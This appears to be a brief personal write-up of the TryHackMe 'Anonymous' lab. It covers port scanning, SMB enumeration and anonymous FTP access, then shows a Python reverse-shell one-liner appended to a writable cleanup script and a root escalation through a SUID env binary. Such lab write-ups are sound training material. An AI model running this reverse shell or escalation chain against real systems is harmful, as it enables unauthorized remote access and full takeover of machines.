https://tryhackme.com/room/anonymous

```
export IP=10.10.106.120; export MYIP=10.4.18.63
```

# nmap
## init
```
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```
## extended
```

```

# smb
```
$ smbclient -L "\\\\$IP"
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        pics            Disk      My SMB Share Directory for Pics
        IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
```

# ftp
`$ ftp "ftp://anonymous@$IP"`
```
ftp> cd scripts
ftp> get clean.sh
ftp> get removed_files.log
ftp> get to_do.txt
```

```
$ echo 'python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.18.63",7780));os.dup2(s
.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'' > shell.sh 

ftp> cd scripts
ftp> append shell.sh clean.sh
```

# low-level shell
```
$ id
uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
$ hostname
anonymous
$ sudo -l
[sudo] password for namelessone: 
```

# root
#suid #env
```
$ ls -la /usr/bin/env
-rwsr-xr-x 1 root root 35000 Jan 18  2018 /usr/bin/env

$ /usr/bin/env /bin/sh -p
# whoami
root
```
